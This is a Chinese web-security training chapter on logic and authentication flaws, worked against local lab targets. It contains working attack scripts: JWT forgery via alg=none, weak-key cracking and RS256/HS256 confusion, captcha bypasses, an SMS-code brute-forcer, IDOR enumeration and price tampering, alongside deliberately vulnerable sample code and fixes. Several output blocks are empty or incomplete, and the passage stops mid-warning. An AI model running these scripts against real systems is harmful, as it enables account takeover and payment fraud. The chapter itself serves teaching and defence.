# W13 逻辑与认证漏洞
## Logic & Authentication Flaws

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L2 核心漏洞期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W01-Web安全导论与HTTP深化|W01]] · [[W03-信息泄露与前端安全|W03]]
> **本章目标**：划清逻辑漏洞与注入类漏洞的边界；在自建靶上打穿水平与垂直越权、JWT 的三种攻击（alg=none、弱密钥爆破、RS256/HS256 混淆，正面回收 [[W01-Web安全导论与HTTP深化#4.4 与 Session 的对照和攻击面|W01 4.4]] 的伏笔）、验证码的四种缺陷与短信码爆破、支付参数篡改与竞态提现；认识未授权访问与隐藏入口；最后汇总成一张防御清单。

[[W04-SQL注入|W04]] 到 [[W12-PHP反序列化|W12]] 的每一章，洞都长在同一侧：输入被服务端当成了代码——SQL、shell、模板、序列化串。本章的洞换了一侧：==每一行代码都按编写意图正确执行，被绕过的是写在代码之间的业务规则==。攻击者发去的每个参数都是"合法输入"，没有引号、没有标签、没有协议前缀，一条 payload 都不需要；需要的只是把三个问题挨个问一遍——这个值应该由谁决定、这个对象属于谁、这个动作能重复吗。

[[W01-Web安全导论与HTTP深化#4.2 手工签发与校验|W01 4.2]] 手工签发过 HS256 的 JWT，[[W01-Web安全导论与HTTP深化#4.4 与 Session 的对照和攻击面|W01 4.4]] 结尾列了三个攻击面并预告"展开在后面的认证漏洞章"——就是本章第 3 节，JWT 的结构与签发原理不再重讲，直接从攻击开打。[[W03-信息泄露与前端安全#6. 前端校验绕过|W03 第 6 节]]"前端校验是体验，不是安全"的结论是本章的原点：把那个结论从注册表单推广到认证、验证码与支付，就是本章的 2、4、5 节。

> [!note] 本章的实验约定
> 六台自建靶，端口集中在 9300 段：越权靶 9300（PHP）、JWT 三台 9301/9302/9303（Python 标准库）、验证码靶 9304（PHP）、支付靶 9305（PHP）。PHP 靶用 [[W02-工具链实战与靶场搭建|W02]] 的 `php -S` 起服务，需要并发的两台加 `PHP_CLI_SERVER_WORKERS=8`（php -S 默认单进程串行，见 [[W07-文件上传|W07]] 的起靶说明）。curl 一律带 `--noproxy '*'` 绕过环境代理直连靶机（[[11-Web安全版图与Burp#6. 常见问题|11 章常见问题表]]讲过这个坑），查询串一律引号包住。

## 1. 逻辑漏洞的边界

先把定义立准：==逻辑漏洞是程序正确地执行了它被写成要做的事，而"它被写成的样子"不安全==。注入类漏洞里，服务端的意图（查询、执行命令、渲染）被输入改写；逻辑漏洞里，服务端原样实现了它的意图，只是这个意图本身漏掉了某条该有的规则。两类放在一起看：

| | 注入类（W04–W12 各章） | 逻辑类（本章） |
| ---- | ---- | ---- |
| 输入的角色 | 被解释成代码：SQL、shell、模板、序列化指令 | 始终是数据，改变的只是业务参数的值 |
| payload 形态 | 引号、标签、协议前缀、序列化语法 | 一个被改过的普通参数值 |
| 语法特征 | 有：可以探测、可以 fuzz | 没有：请求与响应看起来都"正常" |
| 修复方式 | 参数化、转义、白名单 | 补上服务端校验、归属判断、状态标记 |

为什么扫描器扫不出逻辑漏洞：扫描器的工作方式是发 payload、在响应里找可识别的变化（报错、回显、时间差）。逻辑漏洞没有稳定的语法特征可打——`order_id=1003` 返回了 bob 的订单，响应是一个内容完全正常的 200，扫描器既不知道 bob 是谁，也不知道"当前用户不该看到它"。==判断一个正常响应是否越过了业务规则，需要理解业务语义，这一步目前只能靠人==。自动化在逻辑漏洞上唯一的用武之地是放大：发现一个参数可改之后，用 Intruder 一类工具把取值批量跑一遍。

于是手工测逻辑漏洞的通用动作固定为三个问题，本章每一节都是它们在某类功能上的具体化：

1. **这个值应该由谁决定**——客户端提交的，还是服务端自己算的？
2. **这个对象属于谁**——服务端把对象和当前身份对上了吗？
3. **这个动作能重复吗**——"只能一次"的事，有一次性标记吗？

## 2. 越权与 IDOR

### 2.1 认证、授权与两种越权

认证（authentication）回答"你是谁"，授权（authorization）回答"你能干什么"。两件事各自可能出错，越权随之分两种：

| 类型 | 定义 | 例子 | 缺的是哪道检查 |
| ---- | ---- | ---- | ---- |
| 水平越权 | 同级用户之间跨对象访问 | alice 读到 bob 的订单 | 归属检查 |
| 垂直越权 | 低权限用户触达高权限功能 | 普通用户调管理接口 | 角色检查 |

IDOR（Insecure Direct Object Reference，不安全的直接对象引用）是水平越权的高发形态：接口直接拿对象编号（订单号、用户 id、文件名）当参数，又没有校验"这个编号的对象属于当前会话的用户"。11 章版图的九类里没有"逻辑漏洞"这一项——它不是一个独立的技术入口，而是横跨所有功能点的缺陷类，越权是其中发生频率最高的一种。

### 2.2 靶场：三个只查登录的接口

越权靶（9300）有三个用户：alice、bob、admin，`login.php` 用 session 建登录态（[[W01-Web安全导论与HTTP深化#3.3 Session：数据在服务端，cookie 只带编号|W01 3.3]] 的机制）。三个业务接口的写法一致——先做登录检查，然后直接按参数取对象：

```php
<?php
// orders.php —— 订单查询：只验证了"登录"，没有验证"订单属于谁"
session_start();
if (!isset($_SESSION['user'])) {
    http_response_code(401);
    exit("please login\n");
}
$orders = [
    1001 => ['owner' => 'alice', 'item' => '机械键盘', 'amount' => 399],
    1002 => ['owner' => 'alice', 'item' => '显示器',   'amount' => 1299],
    1003 => ['owner' => 'bob',   'item' => '显卡',     'amount' => 4599],
    1004 => ['owner' => 'admin', 'item' => '服务器',   'amount' => 29999],
];
$id = $_GET['order_id'] ?? '';
if (!isset($orders[$id])) {
    http_response_code(404);
    exit("no such order\n");
}
$o = $orders[$id];
echo "order #{$id}: owner={$o['owner']}, item={$o['item']}, amount={$o['amount']}\n";
```

资料接口 `api/profile.php?uid=` 同构：uid 是参数，照查照回。管理接口 `api/admin/stats.php` 的检查是 `isset($_SESSION['user'])`——只问了登录，没问角色。登录 alice，先看自己的订单，再换 id：

```bash
curl -s --noproxy '*' -c alice.jar -d 'username=alice&password=alicepw' http://127.0.0.1:9300/login.php
curl -s --noproxy '*' -b alice.jar 'http://127.0.0.1:9300/orders.php?order_id=1001'
curl -s --noproxy '*' -b alice.jar 'http://127.0.0.1:9300/orders.php?order_id=1003'
```

输出：

```
login ok: alice (role=user)
order #1001: owner=alice, item=机械键盘, amount=399
order #1003: owner=bob, item=显卡, amount=4599
```

第三条把 owner=bob 的订单原样吐给了 alice——登录检查在工作，归属检查不存在。订单号是四位连续数字，一条循环把全表拉走：

```bash
for i in 1001 1002 1003 1004; do curl -s --noproxy '*' -b alice.jar "http://127.0.0.1:9300/orders.php?order_id=$i"; done
```

输出：

```
order #1001: owner=alice, item=机械键盘, amount=399
order #1002: owner=alice, item=显示器, amount=1299
order #1003: owner=bob, item=显卡, amount=4599
order #1004: owner=admin, item=服务器, amount=29999
```

资料接口同病，alice 直接取 bob 的手机号：

```bash
curl -s --noproxy '*' -b alice.jar 'http://127.0.0.1:9300/api/profile.php?uid=2'
```

输出：

```
uid=2 user=bob email=bob@ctf.local phone=13800000002
```

垂直越权用管理接口看。先确认匿名访问确实被挡住，再带上 alice 的会话：

```bash
curl -s --noproxy '*' -o /dev/null -w '%{http_code}\n' http://127.0.0.1:9300/api/admin/stats.php
curl -s --noproxy '*' -b alice.jar http://127.0.0.1:9300/api/admin/stats.php
```

输出：

```
401
== admin stats ==
total_users: 1024
total_sales: 884742.00
flag{v3rt1c4l_n0_r0l3_ch3ck}
```

两行输出放在一起读：401 说明认证这道闸在工作，匿名进不来；200 说明过了这道闸之后没有别的闸。==垂直越权多数时候不是"管理员页面被攻破"，是"检查只有一道"==。

### 2.3 根因与 GUID 的位置

三个接口的根因是同一句话：服务端拿到对象编号后，只问了"对象存在吗"，没问"==对象属于当前会话的用户吗=="。修复因此不是把编号藏好，而是把归属写进查询——订单接口的正确形状是 `SELECT * FROM orders WHERE id = :id AND owner = :session_user`，查不到就是 404；管理接口的正确形状是在认证之后再查一层角色。

> [!warning] 鉴权是三件事，不是一个
> 登录了吗（认证）、是什么角色（角色检查）、对象是不是你的（归属检查），三道检查各拦各的越权：缺第一道是未授权访问（[[#6. 未授权访问与隐藏入口|第 6 节]]），缺第二道是垂直越权，缺第三道是水平越权。测接口时把三道分开想，漏哪道补哪道；把"登录了就行"当成鉴权全部，就是本节三个接口的写法。

> [!info]- 把 1003 换成 GUID 行不行
> 把订单号换成 UUID，本节的枚举循环立刻失效——UUID 的空间是 $2^{122}$，猜是猜不中的。但==洞本身还在==：UUID 挡的是枚举，不挡泄露。订单详情的响应、页面的 JS（[[W03-信息泄露与前端安全#5.1 前端 JS 为什么可信|W03 5.1]]）、访问日志、Referer 头，任何一处把别人的 UUID 带出来，拿过来一访问照样是 bob 的订单。GUID 提高攻击成本，归属校验才是修复，两者不互相替代。

## 3. JWT 攻击：回收 W01 的伏笔

### 3.1 攻击面与三台靶

JWT 的三段结构、base64url 编码、HS256 的签发与校验流程，[[W01-Web安全导论与HTTP深化#4.2 手工签发与校验|W01 4.2]] 已全部铺好。它结尾列的三个攻击面——alg 可控、密钥弱、RS256/HS256 混淆——本章各给一台靶，==每台只留一个洞==，把"攻击成立的条件"看清：

| 靶 | 端口 | 密钥 | 验签逻辑 | 留的洞 |
| ---- | ---- | ---- | ---- | ---- |
| srv_none.py | 9301 | 随机 32 字节，爆破不可行 | 按 alg 分派 | none 分支免验签 |
| srv_weak.py | 9302 | `'sunshine'`（常见口令） | 只认 HS256 | 密钥熵太低 |
| srv_confuse.py | 9303 | RSA 密钥对 | 按 alg 分派，RS256 走真·RSA 验签 | HS256 分支拿公钥字节当 HMAC 密钥 |

三台的接口形状一致：`POST /login`（alice/alicepw）签发 role=member 的 token；`GET /api/admin` 要求 role=admin，满足则回 flag。所有脚本只依赖标准库（hashlib/hmac/base64/json），与 W01 的 `jwt_demo.py` 同一套底子。

### 3.2 alg=none：让验签消失

先问一个问题：token 里的 `alg` 字段由谁写的？——token 的作者，也就是请求的发送者。RFC 7519 定义过 none 算法（不签名），规范要求显式启用才能用；但常见的漏洞实现按 alg 分派验签逻辑时，none 一栏"什么都不做"，效果就是免验签。==把验签方式的开关交给攻击者填的字段，是这个家族一切问题的起点==。

先按朴素思路打一次：只改 payload 的 role、保留原签名。9301 上先登录、解开看、访问管理接口：

```bash
T=$(curl -s --noproxy '*' -d 'username=alice&password=alicepw' http://127.0.0.1:9301/login)
echo "$T"
python3 show_token.py "$T"
curl -s --noproxy '*' -H "Authorization: Bearer $T" http://127.0.0.1:9301/api/admin
```

输出：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJtZW1iZXIiLCJpYXQiOjE3OTI3NjkwMzAsImV4cCI6MTc5Mjc3MjYzMH0.km7SOnj19dQuqTJsOn2S4I9UpiFv9z6I-iYLT24v4mo
header : {"alg":"HS256","typ":"JWT"}
payload: {"sub":"alice","role":"member","iat":1792769030,"exp":1792772630}
sig    : km7SOnj19dQuqTJsOn2S4I9U... (43 字符)

```

把 payload 里的 role 改成 admin、header 与签名原样保留（`tamper_only.py` 只做这一件事）：

```bash
T2=$(python3 tamper_only.py "$T")
echo "$T2"
curl -s --noproxy '*' -H "Authorization: Bearer $T2" http://127.0.0.1:9301/api/admin
```

输出：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5Mjc2OTAzMCwiZXhwIjoxNzkyNzcyNjMwfQ.km7SOnj19dQuqTJsOn2S4I9UpiFv9z6I-iYLT24v4mo

```

第二段解开就是 role:admin，签名还是原来那个——对不上，被拒。HS256 的验签在正常工作，与 [[W01-Web安全导论与HTTP深化#4.2 手工签发与校验|W01 4.2]] 的结论一致。签名挡住了"只改内容"，那就换思路：==把算法换成"不需要签名"的那个==：

```python
# forge_none.py —— 构造 alg=none token：换 header、改 payload、签名段留空（结尾的 . 不能少）
import base64, json, time

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

header = {'alg': 'none', 'typ': 'JWT'}
payload = {'sub': 'alice', 'role': 'admin', 'exp': int(time.time()) + 3600}
h = b64url(json.dumps(header, separators=(',', ':')).encode())
p = b64url(json.dumps(payload, separators=(',', ':')).encode())
print(f'{h}.{p}.')
```

token 仍是三段，第三段长度为 0，分隔的点保留。打靶：

```bash
T3=$(python3 forge_none.py)
echo "$T3"
curl -s --noproxy '*' -H "Authorization: Bearer $T3" http://127.0.0.1:9301/api/admin
```

输出：

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5Mjc3MjYzMH0.
flag{alg_n0ne_1s_fr33}
```

服务端读到 alg=none，走进免验签分支，payload 照单全收。修复只有一条：==验签算法由服务端配置决定，不读 token 里的 alg==；none 与一切白名单外的算法一律拒绝。

### 3.3 HS256 弱密钥：离线爆破

HMAC-SHA256 没有可破的数学结构，它的安全性就是密钥的熵。JWT 对攻击者极其友好的一点：==校验材料全部随 token 自带==——header、payload、签名三段都在手上，爆破可以离线做，对服务端零请求。做法就是最普通的字典爆破：每个候选密钥对 `header.payload` 重算一遍 HMAC，与第三段比较，一致即命中：

```python
# crack_jwt.py —— HS256 弱密钥字典爆破（用法: python3 crack_jwt.py <token>）
import base64, hashlib, hmac, os, sys, time

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

h, p, s = sys.argv[1].split('.')
words_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'words.txt')
# strip() 逐行去尾：字典文件若带 \r（Windows 换行）或空白，不处理会让 HMAC 永远对不上
words = [w.strip() for w in open(words_path, encoding='utf-8').read().splitlines() if w.strip()]

t0 = time.time()
for i, w in enumerate(words, 1):
    expect = b64url(hmac.new(w.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest())
    if hmac.compare_digest(s, expect):
        print(f"[hit] key = '{w}'  (第 {i} 个候选, {time.time() - t0:.3f} 秒)")
        break
else:
    print(f'not found ({len(words)} 个候选, {time.time() - t0:.3f} 秒)')
```

字典 `words.txt` 是 40 个常见口令（123456、password、qwerty 这类）。9302 登录拿一条 member token，直接跑：

```bash
T=$(curl -s --noproxy '*' -d 'username=alice&password=alicepw' http://127.0.0.1:9302/login)
python3 crack_jwt.py "$T"
```

输出：

```
[hit] key = 'sunshine'  (第 14 个候选, 0.000 秒)
```

40 个候选不到一毫秒。密钥还原之后呢？==拿到密钥就等于拿到签发权==——任意 payload 都能签出服务端认账的 token。把 role 改成 admin、exp 写到未来，重新签发：

```python
# forge_weak.py —— 用还原出的密钥重新签发 admin token（用法: python3 forge_weak.py <key>）
import base64, hashlib, hmac, json, sys, time

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

key = sys.argv[1].encode()
now = int(time.time())
header = {'alg': 'HS256', 'typ': 'JWT'}
payload = {'sub': 'alice', 'role': 'admin', 'iat': now, 'exp': now + 3600}
h = b64url(json.dumps(header, separators=(',', ':')).encode())
p = b64url(json.dumps(payload, separators=(',', ':')).encode())
s = b64url(hmac.new(key, f'{h}.{p}'.encode(), hashlib.sha256).digest())
print(f'{h}.{p}.{s}')
```

```bash
T2=$(python3 forge_weak.py sunshine)
curl -s --noproxy '*' -H "Authorization: Bearer $T2" http://127.0.0.1:9302/api/admin
```

输出：

```
flag{jwt_k3y_1n_dict10n4ry}
```

9302 的服务端逻辑毫无破绽：只认 HS256、验签严格、exp 在查——洞只在"密钥是一个人能想到的词"。==密钥用 `bin2hex(random_bytes(32))` 一类的方式生成，字典这条路从根上不存在==。字典规模与耗时的换算很直白：HS256 每候选一次哈希，普通机器单核每秒数十万次，十万量级的 rockyou 常用段不过秒级到分钟级（[[03-工具清单|03 篇]]收录的 hashcat 用 `-m 16500` 能把这个过程再放大几个量级）。

### 3.4 RS256/HS256 混淆：公钥当 HMAC 密钥

两种算法的信任模型不同：HS256 对称，签发与校验用同一把密钥；RS256 非对称，私钥签发、公钥校验，而公钥本来就可以公开。混淆攻击把两者捏在同一份材料上，成立条件两条：

1. **服务端验签用的密钥材料攻击者可得**——RS256 场景下就是公钥本身：公开下载、从 TLS 证书提取、从 `/jwks.json` 一类的接口拿；
2. **验签代码按 token 里的 alg 分派**，而不是按服务端配置只认一种。

攻击流程：把 alg 改成 HS256，用==公钥文件的字节==当 HMAC 密钥给恶意 payload 签名。服务端分派到 HS256 分支，拿它手里同一份公钥字节一验——通过。非对称的"公钥可公开"与对称的"密钥即一切"，就这样被接在了一起。

靶场先造密钥对（[[W01-Web安全导论与HTTP深化#6.2 自签证书与"校验不过就拒连"|W01 6.2]] 用过 openssl 的证书功能，这里用的是密钥对生成）：

```bash
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out priv.pem
openssl pkey -in priv.pem -pubout -out pub.pem
ls -l priv.pem pub.pem
```

输出：

```
-rwxrwxrwx 1 hua hua 1704 Oct 23 23:29 priv.pem
-rwxrwxrwx 1 hua hua  451 Oct 23 23:29 pub.pem
```

9303 的验签材料只有一份配置——下面这段代码的注释与分派逻辑就是漏洞本身：

```python
# srv_confuse.py（节选）—— 验签材料只有一份，被配成了 RSA 公钥文件
KEYFILE = os.path.join(BASE_DIR, 'pub.pem')
KEY = open(KEYFILE, 'rb').read()   # 这份字节既是 RS256 的公钥，又会被 HS256 当 HMAC 密钥——混淆的根源

# ……（rs256_verify：真·RSA 验签，见本节折叠框）……

        alg = header.get('alg')
        # 漏洞点：alg 由攻击者的 token 决定，两路验签用的是同一份"密钥"材料
        if alg == 'RS256':
            if not rs256_verify(inp, b64url_dec(parts[2])):
                return self._reply(401, 'bad signature\n')
        elif alg == 'HS256':
            expect = b64url(hmac.new(KEY, inp, hashlib.sha256).digest())
            if not hmac.compare_digest(parts[2], expect):
                return self._reply(401, 'bad signature\n')
```

这个形状在历史上是真实出现过的：早期 JWT 库的 decode 接口让调用方传"一把钥匙"、算法听 token 的，RS256 配置配上 HS256 的 token 就是今天这条攻击。先走正常流程——login 用私钥签发 RS256 token，合法 token 过 RSA 验签、role=member 被 403，说明 RS256 这条路完好，不是"验签全坏"：

```python
# forge_hs256.py —— 混淆攻击：拿公钥文件的原样字节当 HMAC 密钥签发 admin token
import base64, hashlib, hmac, json, os, time

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

keyfile = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'pub.pem')
KEY = open(keyfile, 'rb').read()     # 原样字节：含 -----BEGIN----- 行与换行，一个字节都不能动

now = int(time.time())
header = {'alg': 'HS256', 'typ': 'JWT'}
payload = {'sub': 'alice', 'role': 'admin', 'iat': now, 'exp': now + 3600}
h = b64url(json.dumps(header, separators=(',', ':')).encode())
p = b64url(json.dumps(payload, separators=(',', ':')).encode())
s = b64url(hmac.new(KEY, f'{h}.{p}'.encode(), hashlib.sha256).digest())
print(f'{h}.{p}.{s}')
```

签名的"密钥"是一份任何人都拿得到的公开文件，却通过了服务端的校验。修复与成立条件一一对应：==算法白名单写死在服务端配置里==；HS256 与 RS256 的密钥材料绝不共用一份配置；现代 JWT 库的 decode 接口要求显式传算法列表，堵的就是"算法听 token 的"这个分派方式。

> [!info]- 靶场里的 RSA 验签是怎么实现的
> 标准库就够。PEM 解出 DER 后按 ASN.1 的 TLV 结构取出模数 n 与指数 e；验签 = `pow(sig, e, n)` 还原填充块，核对 PKCS#1 v1.5 的形状——`00 01 FF…FF 00 || DigestInfo(SHA-256) || 哈希值`，其中 DigestInfo 前缀是固定 19 字节 `3031300d060960864801650304020105000420`。签发侧直接调 `openssl dgst -sha256 -sign priv.pem`。十几行的验证实现是读懂这类漏洞的最短路径，生产环境请用现成密码学库。

### 3.5 kid、jku/x5u 与防御清单

> [!info]- header 里还有两个能"带方向"的字段
> **kid**（key ID）：声明"用哪把密钥验签"。它本身只是个编号，但服务端常拿它拼文件路径（`/keys/` + kid + `.pem`）或拼进 SQL 查密钥表——路径穿越与注入的老朋友换了入口；也算不上新漏洞类型，是攻击面出现在了 header 里。**jku / x5u**：header 里直接写"去哪个 URL 取验签密钥"。服务端若照办且不校验目标，攻击者把密钥换成自己的一把，签什么都合法。两者的一句话防御相同：==header 里的密钥指向一律忽略，密钥来源只认服务端配置==。

把第 3 节的防御收拢成 JWT 的一条最小信任清单：

1. 算法白名单写死在服务端，none 与未声明算法一律拒绝；
2. 密钥高熵随机，不与任何公开材料（公钥、证书内容）共用；
3. `exp`/`nbf`/`iss`/`aud` 逐项校验——签名只证明"没被改过"，不证明"没过期"；
4. header 里的密钥指向（jku/x5u/kid 拼路径）不采纳。

## 4. 验证码绕过

### 4.1 四种缺陷

验证码的设计目标只有一个：把"自动化请求"变成"人来操作"。四种常见实现缺陷，每一种都把这个目标重新交还给自动化：

| 缺陷 | 服务端少了什么 | 打法 | 靶 |
| ---- | ---- | ---- | ---- |
| 校验只在前端 | 服务端根本没验 | 直接发请求 | v1_front.php |
| 不销毁，可复用 | 校验通过后不清除 | 识别一次，反复使用 | v2_reuse.php |
| 回显在响应里 | 响应带上了答案 | 脚本提取，全自动 | captcha_echo.php |
| 空值与弱比较 | 没检查会话里是否发过码 | 不取码、空值提交 | v4_empty.php |

验证码靶在 9304，登录目标统一是 admin/admin123。`captcha.php` 下发 4 位码；真实站点返回图片、人眼识别，靶场直接给文本便于脚本化——==攻击模型不变：识别一次，拿到一个 4 位码==。

### 4.2 缺陷一：校验只在前端

靶子页面把校验全写在发给浏览器的 HTML/JS 里：`maxlength` 限制长度、JS 的 `check()` 保证 4 位才放行提交：

```html
<form method="POST" action="v1_front.php">
用户名 <input name="username"><br>
密码   <input name="password"><br>
验证码 <input name="code" maxlength="4" required><br>
<button onclick="return check()">登录</button>
</form>
<script>
function check() {
  var c = document.forms[0].code.value;
  if (c.length !== 4) { alert('请输入 4 位验证码'); return false; }
  return true;          // 浏览器放行，请求才会发出
}
</script>
```

服务端只查账号密码，`code` 参数看都不看。浏览器上验证码框是必填的，curl 上没有浏览器：

```bash
curl -s --noproxy '*' -d 'username=admin&password=admin123' http://127.0.0.1:9304/v1_front.php
```

输出：

```
login ok -- flag{c4ptch4_js_0nly}
```

这就是 [[W03-信息泄露与前端安全#6. 前端校验绕过|W03 第 6 节]]的结论原样换了个表单：==校验发生在谁的机器上，决定了它是体验还是安全==。

### 4.3 缺陷二：不销毁，可复用

靶子的校验是真的，但校验通过后不销毁：

```php
// v2_reuse.php（节选）—— 缺陷：这里少了 unset($_SESSION['code'])（或重新生成）
if ($c !== ($_SESSION['code'] ?? null)) {
    echo "captcha wrong\n";
    exit;
}
if ($u === 'admin' && $p === 'admin123') { echo "login ok\n"; }
else { echo "wrong password\n"; }
```

攻击者的视角：验证码识别一次（真实场景是人眼或 OCR），然后这个码在会话里长期有效。取一次码，带着同一个码连试三个错误密码，再试正确的：

```bash
C2=$(curl -s --noproxy '*' -c v2.jar http://127.0.0.1:9304/captcha.php | grep -oP 'CAPTCHA: \K.+')
echo "识别到的验证码: $C2"
for pw in wrong1 wrong2 wrong3; do
  curl -s --noproxy '*' -b v2.jar -d "username=admin&password=$pw&code=$C2" http://127.0.0.1:9304/v2_reuse.php
done
curl -s --noproxy '*' -b v2.jar -d "username=admin&password=admin123&code=$C2" http://127.0.0.1:9304/v2_reuse.php
```

输出：

```
识别到的验证码: f2rt
wrong password
wrong password
wrong password
login ok
```

注意三次错误密码的应答都是 `wrong password` 而不是 `captcha wrong`——验证码还有效，爆破密码的大门开到验证码过期为止。修复是"一次性"三个字：==校验无论成败，验证码用后即毁==（`unset` 或立即换新），正常用户最多多输一次，自动化爆破每一步都被重新拦下。

### 4.4 缺陷三：回显在响应里

这次的校验与销毁都没毛病，漏洞在验证码接口自己——一个"忘了删"的调试字段把答案放进响应：

```php
// captcha_echo.php —— img 字段是给 <img> 用的数据，code 字段是多余的
session_start();
$pool = 'abcdefghjkmnpqrstuvwxyz23456789';
$code = '';
for ($i = 0; $i < 4; $i++) { $code .= $pool[random_int(0, strlen($pool) - 1)]; }
$_SESSION['code'] = $code;
header('Content-Type: application/json');
echo json_encode(['img' => '(base64 图片数据省略)', 'code' => $code]), "\n";
```

提取与提交可以串成一条全自动管道，人工完全不在环里：

```bash
R5=$(curl -s --noproxy '*' -c v3.jar http://127.0.0.1:9304/captcha_echo.php)
echo "$R5"
C3=$(echo "$R5" | grep -oP '"code":"\K[^"]+')
echo "脚本提取: $C3"
curl -s --noproxy '*' -b v3.jar -d "username=admin&password=admin123&code=$C3" http://127.0.0.1:9304/v3_echo.php
```

输出：

```
{"img":"(base64 \u56fe\u7247\u6570\u636e\u7701\u7565)","code":"ru7n"}
脚本提取: ru7n
login ok -- flag{c4ptch4_l34k3d_1n_r3sp0ns3}
```

回显不只长 JSON 这样：HTML 注释、Set-Cookie、报错信息都见过验证码的影子。判定方法固定：==拿到验证码接口的原始响应，搜验证码的值==——人眼能看到的东西出现在了机器能读到的位置，就是这一型。

### 4.5 缺陷四：空值与弱比较

靶子的比较逻辑长这样：

```php
// v4_empty.php（节选）—— 缺陷两连：没先 isset 检查会话里是否真的发过验证码；比较用弱比较 ==
$c = $_POST['code'] ?? '';
if ($c == ($_SESSION['code'] ?? null)) {
```

先走正常流程确认服务端确实在验：取一次码、提交一个错误码，被拒：

```bash
curl -s --noproxy '*' -c v4.jar http://127.0.0.1:9304/captcha.php > /dev/null
curl -s --noproxy '*' -b v4.jar -d 'username=admin&password=admin123&code=zzzz' http://127.0.0.1:9304/v4_empty.php
```

输出：

```
captcha wrong
```

然后绕过：换一个全新会话，从头到尾不请求验证码接口，提交时不带 `code` 参数。此时 `$_POST['code']` 缺省成 `''`，而 `$_SESSION['code']` 从未设置过、落到 `null`——PHP 的弱比较里 `'' == null` 成立，验证码这一关凭空通过：

```bash
curl -s --noproxy '*' -c v4b.jar -d 'username=admin&password=admin123' http://127.0.0.1:9304/v4_empty.php
```

输出：

```
login ok -- flag{3mpty_c0de_byp4ss}
```

==弱比较的坑在第 4 节见过一整族，这里换了个落点==：不是类型混淆，是"缺省值与缺失值相等"。修复两条一起上：先 `isset($_SESSION['code'])` 判定确实下发过，比较用 `===`。

### 4.6 短信验证码：无限速等于没有验证码

短信验证码的空间小（4 到 6 位纯数字），它的安全性完全不押在空间上，押在**请求次数限制**上：限速、总量上限、错几次作废。无限速时，$10^N$ 的空间在并发面前只是时间问题。靶场两台：`sms.php` 下发 4 位码（真实短信多为 6 位，原理相同，靶场缩短爆破时间），`sms_ok.php` 逐个比对、**没有任何频率限制**。爆破脚本 8 线程按 0000 到 9999 顺序打（[[06-Python与CTF脚本基础|06 章]]的 requests 多线程写法）：

```python
# sms_crack.py —— 短信验证码无限速爆破：4 位纯数字，0000-9999 逐个试，8 线程（节选）
s = requests.Session()
s.post(BASE + '/sms.php')                       # 触发下发：服务端已生成验证码，攻击者不知道值
sid = s.cookies.get('PHPSESSID')
HDR = {'Cookie': f'PHPSESSID={sid}'}
codes = iter(f'{i:04d}' for i in range(10000))
# ……（8 个线程从共享迭代器取号并发提交，响应含 flag 即停）……
```

```bash
curl -s --noproxy '*' -c sms.jar http://127.0.0.1:9304/sms.php
python3 sms_crack.py
```

输出：

```
sms sent
[hit] code=6070  第 6079 次尝试  用时 5.2 秒
      verify ok -- flag{sms_n0_r4t3_l1m1t}
```

4 位码全空间一万次，8 线程 5 秒出头打穿，吞吐约一千二百次请求每秒。按这个吞吐外推：==6 位码的全空间 $10^6$ 也只要十来分钟==。反过来看防御的效力：限速每分钟 5 条，$10^6$ 的空间要打将近百年——==验证码的强度等于空间大小乘以次数限制，缺任何一项，另一项独木难支==。

> [!warning] 这事只能发生在靶场里
> 对真实短信通道做爆破，消耗的是别人的短信预算与别人的账号安全，属于违法行为。本章所有验证码靶都是本地自建，练习请留在靶场之内。

## 5. 支付与业务逻辑

### 5.1 金额与数量：负数、超大数、浮点

支付靶（9305）的下单接口把单价、数量、运费全部收客户端参数，服务端只做乘加：

```php
<?php
// checkout.php —— 下单：单价、数量、运费全部来自客户端，服务端照单全收
$p = (float)($_POST['price'] ?? 0);
$q = (float)($_POST['qty'] ?? 0);
$f = (float)($_POST['freight'] ?? 0);
$total = $p * $q + $f;
printf("received: price=%s qty=%s freight=%s\n", $_POST['price'] ?? '', $_POST['qty'] ?? '', $_POST['freight'] ?? '');
printf("total = %s\n", var_export($total, true));
if ($total <= 0) {
    echo "order accepted, payable 0 (server owes you " . abs($total) . ")\n";
}
```

正常一单，然后四种姿态挨个来：

```bash
curl -s --noproxy '*' -d 'price=100&qty=1&freight=10' http://127.0.0.1:9305/checkout.php
curl -s --noproxy '*' -d 'price=-80&qty=1&freight=10' http://127.0.0.1:9305/checkout.php
curl -s --noproxy '*' -d 'price=0.1&qty=3&freight=0'  http://127.0.0.1:9305/checkout.php
curl -s --noproxy '*' -d 'price=1&qty=99999999999999999999&freight=0' http://127.0.0.1:9305/checkout.php
curl -s --noproxy '*' -d 'price=59&qty=1&freight=-59' http://127.0.0.1:9305/checkout.php
```

输出：

```

total = 110.0
received: price=-80 qty=1 freight=10
total = -70.0
order accepted, payable 0 (server owes you 70)
received: price=0.1 qty=3 freight=0
total = 0.30000000000000004

```

五段输出逐条读：

- **负单价**：总额 -70，服务端没有下限检查，"应付 0"就是白拿还倒贴；**负运费**是它的孪生（59 元的商品配 -59 元运费，总价归零）；
- **浮点精度**：0.1 在二进制浮点里不可精确表示，`0.1 * 3` 得到 `0.30000000000000004`——拿它和 0.3 做对账比对就出错。金额要么用"分"做整数、要么用 decimal 类型，==浮点数不过账==；
- **超大数**：20 位的数量溢出成科学计数法 `1.0E+20`，考验的是下游每一个类型转换与展示环节。

> [!warning] 变负只是第一步
